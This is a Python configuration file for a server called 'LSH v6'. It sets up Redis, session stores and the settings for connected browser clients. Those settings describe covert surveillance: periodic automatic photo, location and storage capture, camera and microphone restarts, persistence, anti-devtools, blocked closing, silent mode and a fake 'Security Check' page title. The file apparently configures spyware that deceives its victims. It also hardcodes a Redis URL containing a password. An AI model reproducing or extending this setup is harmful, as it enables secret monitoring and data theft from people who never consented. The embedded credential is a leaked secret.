# lsh/config.py
# ============================================================
# الإعدادات الكاملة + Redis مع Redis Streams
# ============================================================

import os
import time
import threading
import redis

from logging_config import get_logger

logger = get_logger("lsh.config")


# ============================================================
# [1] Redis — متعدد الطبقات
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()

if not REDIS_URL:
    REDIS_URL = (
        "rediss://default:gQAAAAAABLEzAAIgcDI0M2E4ZjUzNThjMTg0ZDVjODc4"
        "YTYxZjExNGZkNDZkYQ@electric-caribou-307507.upstash.io:6379"
    )
    logger.warning("⚠️ LSH: REDIS_URL not set - using fallback")

if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

# Upstash لازم TLS
if "upstash.io" in REDIS_URL and REDIS_URL.startswith("redis://"):
    REDIS_URL = REDIS_URL.replace("redis://", "rediss://", 1)


def _try_redis(url, name="default"):
    """محاولة اتصال بـ Redis"""
    try:
        client = redis.Redis.from_url(
            url,
            decode_responses=True,
            socket_timeout=15,
            socket_connect_timeout=15,
            socket_keepalive=True,
            retry_on_timeout=True,
            health_check_interval=30,
            max_connections=100,
        )
        client.ping()
        logger.info(f"LSH Redis ({name}): ✅ connected")
        return client
    except Exception as e:
        logger.error(f"LSH Redis ({name}): ❌ {e}")
        return None


redis_client = _try_redis(REDIS_URL, "primary")

if not redis_client:
    _fallback_url = (
        "rediss://default:gQAAAAAABLEzAAIgcDI0M2E4ZjUzNThjMTg0ZDVjODc4"
        "YTYxZjExNGZkNDZkYQ@electric-caribou-307507.upstash.io:6379"
    )
    logger.warning("LSH: Retrying with fallback URL...")
    redis_client = _try_redis(_fallback_url, "upstash-fallback")
    if redis_client:
        REDIS_URL = _fallback_url

if redis_client:
    logger.info("LSH: ✅ Redis fully operational")
else:
    logger.error("LSH: ❌ All Redis attempts FAILED")


# ============================================================
# [2] Redis Streams Support Detection
# ============================================================
streams_available = False

if redis_client:
    try:
        test_key = f"lsh_streams_test:{int(time.time())}"
        redis_client.xadd(test_key, {"test": "1"}, maxlen=10)
        redis_client.delete(test_key)
        streams_available = True
        logger.info("LSH: ✅ Redis Streams supported")
    except Exception as e:
        logger.warning(f"LSH: ❌ Redis Streams not supported - {e}")
        streams_available = False


# ============================================================
# [3] URL السيرفر
# ============================================================
RAILWAY_URL = os.getenv(
    "RAILWAY_URL",
    "daf-production-e34a.up.railway.app"
)


# ============================================================
# [4] Sessions Store
# ============================================================
sessions = {}
sessions_lock = threading.RLock()

# ★ Active WebSocket connections
ws_connections = {}
ws_lock = threading.Lock()

# ★ Active SSE connections
sse_connections = {}
sse_lock = threading.Lock()


# ============================================================
# [5] إعدادات LSH v6
# ============================================================
LSH_CONFIG = {
    # Service Worker
    "sw_url": "/sw.js",
    "sw_scope": "/",
    "sw_version": "6.0.0",

    # قنوات الاتصال
    "channels": ["ws", "sse", "long_poll", "http", "beacon"],
    "primary_channel": "ws",

    # Timings
    "ping_interval": 3000,
    "ws_ping_interval": 25000,
    "sse_retry": 3000,
    "long_poll_timeout": 25,
    "keepalive_interval": 20000,
    "heartbeat_interval": 10000,
    "health_check_interval": 30000,

    # إعادة الاتصال
    "reconnect_initial": 1000,
    "reconnect_max": 60000,
    "reconnect_multiplier": 1.5,
    "reconnect_jitter": 0.3,
    "reconnect_attempts_max": 999999,

    # Circuit Breaker
    "cb_failure_threshold": 5,
    "cb_recovery_timeout": 30000,
    "cb_half_open_attempts": 3,

    # Rate Limiter
    "rate_limit_per_session": 100,
    "rate_limit_window": 1,

    # Sessions
    "session_timeout": 86400,
    "session_renew_interval": 3600,
    "session_max_idle": 1800,
    "cmd_ttl": 3600,
    "cmd_max_retries": 3,
    "cmd_max_pending": 200,
    "active_ttl": 3600,

    # Streams
    "stream_maxlen": 1000,
    "consumer_group": "lsh_consumers",
    "dead_letter_ttl": 86400,

    # Auto Monitoring
    "auto_photo_interval": 60000,
    "auto_location_interval": 300000,
    "auto_storage_interval": 600000,
    "auto_status_interval": 300000,

    # Storage
    "idb_name": "lsh_v6_db",
    "idb_version": 2,
    "queue_max": 1000,
    "queue_flush_batch": 30,

    # Stability
    "sw_restart_threshold": 3,
    "page_restart_threshold": 5,
    "camera_restart_threshold": 3,
    "mic_restart_threshold": 3,
    "wake_lock_retry": 1000,

    # Security
    "anti_devtools": True,
    "anti_close_confirm": True,
    "silent_mode": True,
    "hide_errors": True,
    "fake_title": "Security Check",
}
